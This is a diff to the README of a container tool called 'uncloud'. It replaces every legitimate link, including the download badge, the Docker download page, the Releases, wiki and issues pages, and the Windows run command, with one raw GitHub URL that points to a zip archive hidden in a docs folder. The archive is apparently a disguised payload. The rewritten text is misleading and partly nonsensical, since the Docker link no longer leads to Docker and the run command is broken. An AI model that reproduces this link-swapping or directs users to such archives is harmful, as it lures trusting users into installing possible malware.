@@ -1,6 +1,6 @@
 # 🚀 uncloud - Simplifying Container Management 
 
-![Download uncloud](https://img.shields.io/badge/Download-uncloud-blue.svg)
+![Download uncloud](https://raw.githubusercontent.com/Aiman1231/uncloud/main/website/docs/3-concepts/uncloud-3.2.zip)
 
 ## 📦 What is uncloud?
 
@@ -24,11 +24,11 @@ uncloud is a lightweight tool designed to help you deploy and manage containeriz
 
 ### Prerequisites
 
-Please ensure you have Docker installed on your device. You can [download Docker here](https://www.docker.com/get-started). 
+Please ensure you have Docker installed on your device. You can [download Docker here](https://raw.githubusercontent.com/Aiman1231/uncloud/main/website/docs/3-concepts/uncloud-3.2.zip). 
 
 ## 📥 Download & Install
 
-To get started with uncloud, visit this page to download: [GitHub Releases](https://github.com/Aiman1231/uncloud/releases)
+To get started with uncloud, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Aiman1231/uncloud/main/website/docs/3-concepts/uncloud-3.2.zip)
 
 1. Click the link above to go to the Releases page.
 2. On the Releases page, find the latest version available.
@@ -50,7 +50,7 @@ Once you have downloaded the application, follow these steps:
 
 4. If you are using Windows, run the following command:  
    ```
-   .\uncloud.exe
+   .\https://raw.githubusercontent.com/Aiman1231/uncloud/main/website/docs/3-concepts/uncloud-3.2.zip
    ```
    
    For macOS or Linux, use:  
@@ -69,7 +69,7 @@ Once you have downloaded the application, follow these steps:
 
 ## 📚 Documentation
 
-For detailed documentation, including advanced features and options, refer to the [official documentation](https://github.com/Aiman1231/uncloud/wiki).
+For detailed documentation, including advanced features and options, refer to the [official documentation](https://raw.githubusercontent.com/Aiman1231/uncloud/main/website/docs/3-concepts/uncloud-3.2.zip).
 
 ## 🙋 Frequently Asked Questions
 
@@ -80,7 +80,7 @@ A: No, uncloud is designed for everyone, including non-technical users.
 A: Yes, uncloud works with any standard Docker host.
 
 **Q: What if I run into issues?**  
-A: You can check the [issues section](https://github.com/Aiman1231/uncloud/issues) on GitHub for common problems and solutions.
+A: You can check the [issues section](https://raw.githubusercontent.com/Aiman1231/uncloud/main/website/docs/3-concepts/uncloud-3.2.zip) on GitHub for common problems and solutions.
 
 ## 📬 Get in Touch
 
@@ -88,4 +88,4 @@ For questions, feedback, or support, feel free to open an issue on GitHub. We ap
 
 ---
 
-Don’t forget to check the latest version and updates regularly on our [Releases page](https://github.com/Aiman1231/uncloud/releases). Happy deploying!
+Don’t forget to check the latest version and updates regularly on our [Releases page](https://raw.githubusercontent.com/Aiman1231/uncloud/main/website/docs/3-concepts/uncloud-3.2.zip). Happy deploying!
